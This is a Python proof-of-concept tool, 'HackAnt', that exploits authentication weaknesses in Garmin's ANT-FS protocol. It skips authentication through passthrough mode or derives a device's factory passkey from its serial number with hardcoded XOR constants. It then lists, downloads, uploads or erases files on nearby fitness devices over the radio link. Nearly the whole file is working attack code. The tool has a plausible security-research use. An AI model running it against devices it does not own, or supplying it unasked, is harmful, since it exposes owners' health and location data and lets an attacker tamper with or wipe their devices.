#!/usr/bin/env python3

from __future__ import absolute_import, print_function

from argparse import ArgumentParser
import os
import sys
import array
import logging
from ant.fs.manager import Application, AntFSAuthenticationException, \
        AntFSTimeException, AntFSDownloadException, AntFSUploadException
from ant.fs.file import File

_logger = logging.getLogger()
_filetypes = [
        "device",
        "setting",
        "sport",
        "activity",
        "workout",
        "course",
        "schedules",
        "weight",
        "totals",
        "goals",
        "blood_pressure",
        "monitoring_a",
        "activity_summary",
        "monitoring_daily",
        "monitoring_b"
        ]

class HackAnt(Application):
    def __init__(self, args):
        Application.__init__(self)

        self._auth = args.auth
        if self._auth == "passkey":
            self._passkey = [int(x, 16) for x in args.passkey.split(':')]
        self._action = args.action
        if self._action == "erase":
            self._index = args.index
        elif self._action == "download":
            self._file = args.file
            self._index = args.index
        elif self._action == "upload":
            self._file = args.file
            self._index = args.index
            self._type = getattr(File.Identifier, args.type.upper())

    def setup_channel(self, channel):
        channel.set_period(4096)
        channel.set_search_timeout(255)
        channel.set_rf_freq(50)
        channel.set_search_waveform([0x53, 0x00])
        channel.set_id(0, 0x01, 0)

        channel.open()
        _logger.debug("Searching...")

    def on_link(self, beacon):
        _logger.debug("HackAnt: Link", beacon.get_serial(), beacon.get_descriptor())
        self.link()
        return True

    def on_authentication(self, beacon):
        serial = self.authentication_serial()
        _logger.debug("HackAnt: Auth", serial)
        try:
            if self._auth == "passthrough":
                _logger.debug("Attempting passthrough authentication.")
                self.authentication_passthrough()
            elif self._auth == "factory":
                _logger.debug("Attempting passkey authentication with factory key.")
                passkey = self.factory_passkey(serial[0])
                self.authentication_passkey(passkey)
            elif self._auth == "passkey":
                _logger.debug("Attempting passkey authentication.")
                self.authentication_passkey(self._passkey)
            return True
        except AntFSAuthenticationException as e:
            return False

    def on_transport(self, beacon):
        try:
            self.set_time()
        except (AntFSTimeException, AntFSDownloadException, AntFSUploadException):
            _logger.error("Could not set time")

        _logger.debug("HackAnt: Transport")
        getattr(self, "_" + self._action)()

    def factory_passkey(self, device_id):
        n = ((device_id ^ 0x7d215abb) << 32) + (device_id ^ 0x42b93f06)
        passkey = [(n >> (8 * i) & 255) for i in range(8)]
        print("Passkey generated from Device ID (%s): %s" % (device_id, passkey))
        return passkey

    def _dir(self):
        directory = self.download_directory()
        print("Directory version:      ", directory.get_version())
        print("Directory time format:  ", directory.get_time_format())
        print("Directory system time:  ", directory.get_current_system_time())
        print("Directory last modified:", directory.get_last_modified())
        directory.print_list()

    def _erase(self):
        self.erase(self._index)

    def _download(self):
        data = self.download(self._index)
        with open(self._file, "wb") as f:
            f.write(data)

    def _upload(self):
        with open(self._file, "rb") as f:
            data = array.array('B', f.read())
        if self._index is not None:
            self.upload(self._index, data, callback = None)
        else:
            index = self.create(self._type, data, callback = None)

def main():
    parser = ArgumentParser(description="Demos various weaknesses in Garmin ANT-FS implementation.")
    parser.add_argument("--debug", action="store_true", help="Enable debug logs.")
    parser.add_argument("--auth", default="passthrough", choices=[
        "passthrough",
        "factory",
        "passkey"], help="Authentication mode.")
    parser.add_argument("--passkey", help="Key to use for passkey authentication.")

    sp = parser.add_subparsers(dest="action")
    sp_directory = sp.add_parser("dir", help="Displays ANT-FS directory structure.")
    sp_upload = sp.add_parser("upload", help="Uploads a file to the device.")
    sp_upload.add_argument("--file", help="File to upload.", required=True)
    sp_upload.add_argument("--index", help="ANT-FS index to upload to.", type=int, default=None)
    sp_upload.add_argument("--type", choices=_filetypes, help="ANT-FS file type.")
    sp_download = sp.add_parser("download", help="Downloads a file from the device.")
    sp_download.add_argument("--file", help="File to save content to.", required=True)
    sp_download.add_argument("--index", help="ANT-FS index to download.", type=int, required=True)
    sp_erase = sp.add_parser("erase", help="Erases a file from the device.")
    sp_erase.add_argument("--index", help="ANT-FS index to erase.", type=int, required=True)

    args = parser.parse_args()

    if args.debug:
        _logger.setLevel(logging.DEBUG)
    _logger.addHandler(logging.StreamHandler())

    try:
        a = HackAnt(args)
        _logger.debug("Start")
        a.start()
    except:
        _logger.debug("Aborted")
        raise
    finally:
        _logger.debug("Stop")


if __name__ == "__main__":
    sys.exit(main())
